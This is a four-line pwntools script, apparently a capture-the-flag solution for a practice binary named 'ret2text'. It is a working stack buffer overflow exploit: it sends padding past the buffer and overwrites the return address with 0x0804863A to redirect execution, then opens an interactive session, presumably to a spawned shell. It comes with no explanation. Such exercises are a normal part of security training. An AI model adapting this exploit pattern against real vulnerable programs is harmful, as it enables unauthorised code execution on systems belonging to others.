from pwn import *
p = process("./ret2text")
p.sendline(b"a"*(0x64+3*4) + p32(0x0804863A))
p.interactive()